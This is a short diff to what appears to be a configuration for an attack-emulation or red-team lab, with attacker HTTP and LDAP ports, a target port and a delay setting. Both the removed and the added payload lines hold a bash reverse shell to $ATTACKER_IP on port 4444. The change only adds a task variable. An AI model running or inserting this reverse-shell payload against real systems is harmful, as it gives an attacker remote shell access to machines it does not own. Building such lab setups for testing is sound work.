@@ -17,7 +17,7 @@
               "attacker_http_port": 8088,
               "attacker_ldap_port": 1389,
               "target_port": 8080,
-              "payload": "/bin/bash -c \"/bin/bash -i >& /dev/tcp/$ATTACKER_IP/$REVERSE_SHELL_PORT 0>&1\" | tee /tmp/log.txt",
+              "payload": "/bin/bash -c \"TASK=hostenumonly /bin/bash -i >& /dev/tcp/$ATTACKER_IP/$REVERSE_SHELL_PORT 0>&1\" | tee /tmp/log.txt",
               "attack_delay": 50400,
               "reverse_shell_port": 4444
             }
